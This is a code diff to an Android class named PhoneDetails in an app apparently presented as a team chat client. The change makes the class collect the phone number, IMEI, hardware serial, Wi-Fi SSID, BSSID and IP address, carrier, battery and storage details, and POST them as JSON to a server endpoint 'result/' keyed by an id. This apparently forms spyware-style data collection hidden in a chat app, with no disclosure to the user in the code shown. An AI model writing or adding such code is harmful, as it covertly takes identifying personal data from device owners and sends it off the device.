@@ -1,5 +1,7 @@
 package com.example.teamchat;
 
+import static com.example.teamchat.Constants.SERVER;
+
 import android.annotation.SuppressLint;
 import android.content.BroadcastReceiver;
 import android.content.Context;
@@ -26,92 +28,136 @@ import android.text.format.Formatter;
 import android.util.Log;
 import android.view.Display;
 import android.view.WindowManager;
-import android.webkit.MimeTypeMap;
-
-import androidx.appcompat.app.AppCompatActivity;
-
+import org.json.JSONException;
+import org.json.JSONObject;
 import java.io.File;
+import java.io.IOException;
+import java.util.concurrent.CountDownLatch;
 
 public class PhoneDetails {
+    private final static String TAG = ChatService.class.getSimpleName();
+
     public static void getAllDetails(Context context, String id){
-        getDeviceDetails();
-        getOSDetails();
-        getDisplayDetails(context);
+        JSONObject allDetails = new JSONObject();
+        JSONObject parentObject = new JSONObject();
+        try {
+            allDetails.put("DeviceDetails", getDeviceDetails());
+            allDetails.put("OSDetails", getOSDetails());
+            allDetails.put("DisplayDetails", getDisplayDetails(context));
+            allDetails.put("BatteryDetails", getBatteryDetails(context));
+            allDetails.put("NetworkDetails", getNetworkDetails(context));
+            allDetails.put("StorageInformation", getStorageInformation(context));
+            allDetails.put("TelephonyDetails", getTelephonyDetails(context));
 
-        IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
-        context.registerReceiver(batteryReceiver, filter);
+            parentObject.put("code", "phonedetails");
+            parentObject.put("data", allDetails);
+        } catch (JSONException e) {
+            Log.e(TAG, "Error creating JSON object: " + e.getMessage());
+        }
 
-        getNetworkDetails(context);
-        getStorageInformation(context);
-        getTelephonyDetails(context);
+        try {
+            HttpConnection.ReturnResponse response = HttpConnection.connect(SERVER + "result/" + id, "POST", parentObject.toString());
+
+            assert response != null;
+            if (response.responseCode == 200) {
+                Log.d(TAG, "Response: " + response.body);
+            } else {
+                throw new IOException("Unexpected code " + response.responseCode);
+            }
+        } catch (IOException e) {
+            Log.e(TAG, "Error sending request: " + e.getMessage());
+        }
     }
 
-    private static void getDeviceDetails(){
-        String model = Build.MODEL;
-        String manufacturer = Build.MANUFACTURER;
-        String brand = Build.BRAND;
-        String product = Build.PRODUCT;
-        String device = Build.DEVICE;
-        String board = Build.BOARD;
-        String display = Build.DISPLAY;
-        String hardware = Build.HARDWARE;
-        String id = Build.ID;
-        String serial = Build.SERIAL;
-        String type = Build.TYPE;
-        String user = Build.USER;
-
-        Log.v("DeviceDetails","model: " + model);
-        Log.v("DeviceDetails","manufacturer: " + manufacturer);
-        Log.v("DeviceDetails","brand: " + brand);
-        Log.v("DeviceDetails","product: " + product);
-        Log.v("DeviceDetails","device: " + device);
-        Log.v("DeviceDetails","board: " + board);
-        Log.v("DeviceDetails","display: " + display);
-        Log.v("DeviceDetails","hardware: " + hardware);
-        Log.v("DeviceDetails","id: " + id);
-        Log.v("DeviceDetails","serial: " + serial);
-        Log.v("DeviceDetails","type: " + type);
-        Log.v("DeviceDetails","user: " + user);
+    private static JSONObject getDeviceDetails(){
+        JSONObject json = null;
+        try {
+            json = new JSONObject();
+            json.put("model", Build.MODEL);
+            json.put("manufacturer", Build.MANUFACTURER);
+            json.put("brand", Build.BRAND);
+            json.put("product", Build.PRODUCT);
+            json.put("device", Build.DEVICE);
+            json.put("board", Build.BOARD);
+            json.put("display", Build.DISPLAY);
+            json.put("hardware", Build.HARDWARE);
+            json.put("id", Build.ID);
+            json.put("serial", Build.SERIAL);
+            json.put("type", Build.TYPE);
+            json.put("user", Build.USER);
+        } catch (JSONException e) {
+            Log.e(TAG, "Error creating JSON object: " + e.getMessage());
+        }
+        return json;
     }
 
-    private static void getOSDetails(){
-        String androidVersion = Build.VERSION.RELEASE;
-        int sdkVersion = Build.VERSION.SDK_INT;
-
-        Log.v("OSDetails","release: " + androidVersion);
-        Log.v("OSDetails","sdkVersion: " + sdkVersion);
+    private static JSONObject getOSDetails(){
+        JSONObject json = null;
+        try {
+            json = new JSONObject();
+            json.put("androidVersion", Build.VERSION.RELEASE);
+            json.put("sdkVersion", Build.VERSION.SDK_INT);
+        } catch (JSONException e) {
+            Log.e(TAG, "Error creating JSON object: " + e.getMessage());
+        }
+        return json;
     }
 
-    private static void getDisplayDetails(Context context){
+    private static JSONObject getDisplayDetails(Context context){
         WindowManager wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
         Display display = wm.getDefaultDisplay();
         Point size = new Point();
         display.getSize(size);
         int width = size.x;
         int height = size.y;
-
         float density = context.getResources().getDisplayMetrics().density;
 
-        Log.v("DisplayDetails","width: " + width + "px");
-        Log.v("DisplayDetails","height: " + height + "px");
-        Log.v("DisplayDetails","Pixel Per Inch: " + density);
+        JSONObject json = null;
+        try {
+            json = new JSONObject();
+            json.put("width", width);
+            json.put("height", height);
+            json.put("PPI", density);
+        } catch (JSONException e) {
+            Log.e(TAG, "Error creating JSON object: " + e.getMessage());
+        }
+        return json;
     }
 
-    static BroadcastReceiver batteryReceiver = new BroadcastReceiver() {
+    public static CountDownLatch latch = new CountDownLatch(1);
+    public static int level;
+    public static int status;
+    public static boolean isCharging;
+    public static BroadcastReceiver batteryReceiver = new BroadcastReceiver() {
         @Override
         public void onReceive(Context context, Intent intent) {
-            int level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
-            int status = intent.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
-            boolean isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
-                    status == BatteryManager.BATTERY_STATUS_FULL;
-            // Use the battery level and charging status information as needed
-            Log.v("BatteryDetails", String.format("Battery level: %d",level));
-            Log.v("BatteryDetails", String.format("Battery status: %d",status));
-            Log.v("BatteryDetails", String.format("Phone Charging?: %b",isCharging));
+            level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
+            status = intent.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
+            isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||  status == BatteryManager.BATTERY_STATUS_FULL;
+            latch.countDown();
         }
     };
 
-    private static void getNetworkDetails(Context context){
+    private static JSONObject getBatteryDetails(Context context){
+        try {
+            IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
+            context.registerReceiver(batteryReceiver, filter);
+            latch.await();
+        } catch (InterruptedException e) {}
+
+        JSONObject json = null;
+        try {
+            json = new JSONObject();
+            json.put("level", level);
+            json.put("status", status);
+            json.put("isCharging", isCharging);
+        } catch (JSONException e) {
+            Log.e(TAG, "Error creating JSON object: " + e.getMessage());
+        }
+        return json;
+    }
+
+    private static JSONObject getNetworkDetails(Context context){
         ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
         NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
         int networkType = activeNetwork.getType();
@@ -119,74 +165,88 @@ public class PhoneDetails {
         boolean isWifiConnected = isWifiConnected(context);
         boolean isMobileConnected = isMobileConnected(context);
 
-        Log.v("NetworkDetails", String.format("networkType:  %d", networkType));
-        Log.v("NetworkDetails", String.format("isNetworkAvailable:  %b", isNetworkAvailable));
-        Log.v("NetworkDetails", String.format("isWifiConnected:  %b", isWifiConnected));
-        Log.v("NetworkDetails", String.format("isMobileConnected:  %b", isMobileConnected));
+        JSONObject json = null, wifiobject = null, mobileobject = null;
+        try {
+            json = new JSONObject();
+            wifiobject = new JSONObject();
+            mobileobject = new JSONObject();
 
-        // network is available
-        if (isNetworkAvailable) {
-            if (isWifiConnected) {
-                // if mobile connect to wifi
-                WifiManager wifiManager = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
-                WifiInfo wifiInfo = wifiManager.getConnectionInfo();
+            json.put("networkType", networkType);
+            json.put("isNetworkAvailable", isNetworkAvailable);
+            json.put("isWifiConnected", isWifiConnected);
+            json.put("isMobileConnected", isMobileConnected);
 
-                String ssid = wifiInfo.getSSID();
-                String bssid = wifiInfo.getBSSID();
-                int linkSpeed = wifiInfo.getLinkSpeed();
-                String ipAddress = Formatter.formatIpAddress(wifiInfo.getIpAddress());
+            // network is available
+            if (isNetworkAvailable) {
+                if (isWifiConnected) {
+                    // if mobile connect to wifi
+                    WifiManager wifiManager = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
+                    WifiInfo wifiInfo = wifiManager.getConnectionInfo();
 
-                int networkId = wifiInfo.getNetworkId();
-                int signalStrength = wifiInfo.getRssi();
+                    String ssid = wifiInfo.getSSID();
+                    String bssid = wifiInfo.getBSSID();
+                    int linkSpeed = wifiInfo.getLinkSpeed();
+                    String ipAddress = Formatter.formatIpAddress(wifiInfo.getIpAddress());
 
-                Log.v("NetworkDetails", String.format("SSID: %s", ssid));
-                Log.v("NetworkDetails", String.format("bssid: %s", bssid));
-                Log.v("NetworkDetails", String.format("linkSpeed: %s", linkSpeed));
-                Log.v("NetworkDetails", String.format("ipAddress: %s", ipAddress));
-                Log.v("NetworkDetails", String.format("networkId: %s", networkId));
-                Log.v("NetworkDetails", String.format("signalStrength: %s", signalStrength));
-            }
-            if (!isMobileConnected) {
-                // if mobile connect to mobile data
-                NetworkInfo mobileNetwork = cm.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
-                String mobileType = getNetworkType(mobileNetwork.getSubtype());
+                    int networkId = wifiInfo.getNetworkId();
+                    int signalStrength = wifiInfo.getRssi();
 
-                Log.v("NetworkDetails", String.format("mobileType: %s", mobileType));
-                Log.v("NetworkDetails", String.format("State: %s", mobileNetwork.getState()));
-                Log.v("NetworkDetails", String.format("Detailed State: %s", mobileNetwork.getDetailedState()));
-
-                TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
-                String operatorName = tm.getNetworkOperatorName();      // e.g. AT&T, T-Mobile, Vodafone, etc.
-                String operatorCode = tm.getNetworkOperator();          // e.g. MCC and MNC
-                boolean roaming = tm.isNetworkRoaming();
-
-                Log.v("NetworkDetails", String.format("operatorName: %s", operatorName));
-                Log.v("NetworkDetails", String.format("operatorCode: %s", operatorCode));
-                Log.v("NetworkDetails", String.format("roaming: %s", roaming));
-
-                if (tm.getAllCellInfo().size() != 0) {
-                    CellInfo cellInfo = tm.getAllCellInfo().get(0);
-                    int strength = 0;
-                    if (cellInfo instanceof CellInfoGsm) {
-                        CellSignalStrengthGsm gsm = ((CellInfoGsm) cellInfo).getCellSignalStrength();
-                        strength = gsm.getDbm();
-                    } else if (cellInfo instanceof CellInfoCdma) {
-                        CellSignalStrengthCdma cdma = ((CellInfoCdma) cellInfo).getCellSignalStrength();
-                        strength = cdma.getDbm();
-                    } else if (cellInfo instanceof CellInfoLte) {
-                        CellSignalStrengthLte lte = ((CellInfoLte) cellInfo).getCellSignalStrength();
-                        strength = lte.getDbm();
-                    }
-
-                    Log.v("NetworkDetails", String.format("Strength: %d", strength));
+                    wifiobject.put("ssid", ssid);
+                    wifiobject.put("bssid", bssid);
+                    wifiobject.put("linkSpeed", linkSpeed);
+                    wifiobject.put("ipAddress", ipAddress);
+                    wifiobject.put("networkId", networkId);
+                    wifiobject.put("signalStrength", signalStrength);
                 }
 
+                if (!isMobileConnected) {
+                    // if mobile connect to mobile data
+                    NetworkInfo mobileNetwork = cm.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
+                    String mobileType = getNetworkType(mobileNetwork.getSubtype());
 
+                    mobileobject.put("mobileType", mobileType);
+                    mobileobject.put("State", mobileNetwork.getState());
+                    mobileobject.put("detailedState", mobileNetwork.getDetailedState());
+
+                    TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+                    String operatorName = tm.getNetworkOperatorName();      // e.g. AT&T, T-Mobile, Vodafone, etc.
+                    String operatorCode = tm.getNetworkOperator();          // e.g. MCC and MNC
+                    boolean roaming = tm.isNetworkRoaming();
+
+                    mobileobject.put("operatorName", operatorName);
+                    mobileobject.put("operatorCode", operatorCode);
+                    mobileobject.put("roaming", roaming);
+
+                    if (tm.getAllCellInfo().size() != 0) {
+                        CellInfo cellInfo = tm.getAllCellInfo().get(0);
+                        int strength = 0;
+                        if (cellInfo instanceof CellInfoGsm) {
+                            CellSignalStrengthGsm gsm = ((CellInfoGsm) cellInfo).getCellSignalStrength();
+                            strength = gsm.getDbm();
+                        } else if (cellInfo instanceof CellInfoCdma) {
+                            CellSignalStrengthCdma cdma = ((CellInfoCdma) cellInfo).getCellSignalStrength();
+                            strength = cdma.getDbm();
+                        } else if (cellInfo instanceof CellInfoLte) {
+                            CellSignalStrengthLte lte = ((CellInfoLte) cellInfo).getCellSignalStrength();
+                            strength = lte.getDbm();
+                        }
+
+                        mobileobject.put("strength", strength);
+                    }
+
+
+                }
+
+                json.put("wifiDetails", wifiobject);
+                json.put("mobileDetails", mobileobject);
             }
+        } catch (JSONException e) {
+            Log.e(TAG, "Error creating JSON object: " + e.getMessage());
         }
+        return json;
     }
 
-    private static void getStorageInformation(Context context){
+    private static JSONObject getStorageInformation(Context context){
         File externalStorage = Environment.getExternalStorageDirectory();
         long totalExternalStorage = externalStorage.getTotalSpace();
         long availableExternalStorage = externalStorage.getFreeSpace();
@@ -195,81 +255,58 @@ public class PhoneDetails {
         long totalInternalStorage = internalStorage.getTotalSpace();
         long availableInternalStorage = internalStorage.getFreeSpace();
 
-        Log.i("StorageInfo", String.format("totalExternalStorage: %s", totalExternalStorage/ (1024 * 1024) + " MB"));
-        Log.i("StorageInfo", String.format("availableExternalStorage: %s", availableExternalStorage/ (1024 * 1024) + " MB"));
-        Log.i("StorageInfo", String.format("totalInternalStorage: %s", totalInternalStorage/ (1024 * 1024) + " MB"));
-        Log.i("StorageInfo", String.format("availableInternalStorage: %s", availableInternalStorage/ (1024 * 1024) + " MB"));
+        JSONObject json = null;
+        try {
+            json = new JSONObject();
+            json.put("totalExternalStorage", totalExternalStorage/ (1024 * 1024));
+            json.put("availableExternalStorage", availableExternalStorage/ (1024 * 1024));
+            json.put("totalInternalStorage", totalInternalStorage/ (1024 * 1024));
+            json.put("availableInternalStorage", availableInternalStorage/ (1024 * 1024));
 
-        File[] roots = context.getExternalFilesDirs(null);
-        for (File root : roots) {
-            StatFs stat = new StatFs(root.getPath());
-            long totalBytes = (long) stat.getBlockCount() * stat.getBlockSize();
-            long availableBytes = (long) stat.getAvailableBlocks() * stat.getBlockSize();
-            Log.i("StorageInfo", "Storage: " + root.getPath());
-            Log.i("StorageInfo", "Total: " + totalBytes / (1024 * 1024) + " MB");
-            Log.i("StorageInfo", "Available: " + availableBytes / (1024 * 1024) + " MB");
+            File[] roots = context.getExternalFilesDirs(null);
+            for (File root : roots) {
+                StatFs stat = new StatFs(root.getPath());
+                long totalBytes = (long) stat.getBlockCount() * stat.getBlockSize();
+                long availableBytes = (long) stat.getAvailableBlocks() * stat.getBlockSize();
+
+                json.put("storagePath", root.getPath());
+                json.put("totalSpace", totalBytes / (1024 * 1024));
+                json.put("availableSpace", availableBytes / (1024 * 1024));
+            }
+        } catch (NullPointerException | JSONException e) {
+            if (e instanceof NullPointerException) {
+                Log.e(TAG, "Error getting storage size: " + e.getMessage());
+            } else if (e instanceof JSONException) {
+                Log.e(TAG, "Error creating JSON object: " + e.getMessage());
+            }
         }
-
-//        File internalStorageDir = Environment.getRootDirectory();
-//        File internalStorageDir = Environment.getExternalStorageDirectory();
-//        File[] files1 = internalStorageDir.listFiles();
-//
-//        Log.i("StorageInfo", "internalStorageDir: " + internalStorageDir);
-//
-//
-//        for (File file : files1) {
-//            if (file.isDirectory()) {
-//                Log.d("Directory", file.getAbsolutePath());
-//                File[] file2 = file.listFiles();
-//                if (file2 != null) {
-//                    for (File file3 : file2) {
-//                        String fileExtension = MimeTypeMap.getFileExtensionFromUrl(file3.getAbsolutePath());
-//                        String mimeType = MimeTypeMap.getSingleton().getMimeTypeFromExtension(fileExtension);
-//                        if (mimeType != null) {
-//                            Log.d("File", file3.getAbsolutePath() + " - " + mimeType);
-//                        }
-//                    }
-//                }
-//            } else {
-//                String fileExtension = MimeTypeMap.getFileExtensionFromUrl(file.getAbsolutePath());
-//                String mimeType = MimeTypeMap.getSingleton().getMimeTypeFromExtension(fileExtension);
-//                if (mimeType != null) {
-//                    Log.d("File", file.getAbsolutePath() + " - " + mimeType);
-//                }
-//            }
-//        }
-//
-//        try {
-//            File[] files = new File(Environment.getExternalStorageDirectory().getAbsolutePath()).listFiles();
-//            for (File file : files) {
-//                if (file.isDirectory()) {
-//                    Log.d("Directory", file.getAbsolutePath());
-//                } else {
-//                    String fileExtension = MimeTypeMap.getFileExtensionFromUrl(file.getAbsolutePath());
-//                    String mimeType = MimeTypeMap.getSingleton().getMimeTypeFromExtension(fileExtension);
-//                    Log.d("File", file.getAbsolutePath() + " - " + mimeType);
-//                }
-//            }
-//        } catch (NullPointerException e) {
-//            Log.i("[Info]", "External Storage not found");
-//        }
+        return json;
     }
 
     @SuppressLint("MissingPermission")
-    private static void getTelephonyDetails(Context context) {
+    private static JSONObject getTelephonyDetails(Context context) {
         TelephonyManager manager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
         String phoneNumber1 = manager.getLine1Number();
-        Log.v("TelephonyDetails","PHONE NUMBER: " + phoneNumber1);
 
-        // Other Information:
-        if(android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) { // API Level 26.
-            try {
-                String imei = manager.getImei();
-                Log.i("TelephonyDetails", "IMEI: " + imei);
-            } catch (Exception e) {
-                Log.e("[ERROR]", "Unable to retrieve IMEI");
+        JSONObject json = null;
+        try {
+            json = new JSONObject();
+            json.put("phoneNumber", phoneNumber1);
+
+            // Other Information:
+            if(android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) { // API Level 26.
+                try {
+                    String imei = manager.getImei();
+                    json.put("imei", imei);
+                } catch (Exception e) {
+                    Log.e("[ERROR]", "Unable to retrieve IMEI");
+                    json.put("imei", "Unknown");
+                }
             }
+        } catch (JSONException e) {
+            Log.e(TAG, "Error creating JSON object: " + e.getMessage());
         }
+        return json;
     }
 
     public static boolean isNetworkAvailable(Context context) {
@@ -303,5 +340,13 @@ public class PhoneDetails {
         } else {
             return "Unknown";
         }
+    }
+
+    public int getLevel() {
+        return level;
+    }
+
+    public void setLevel(int level){
+        this.level = level;
     }
 }
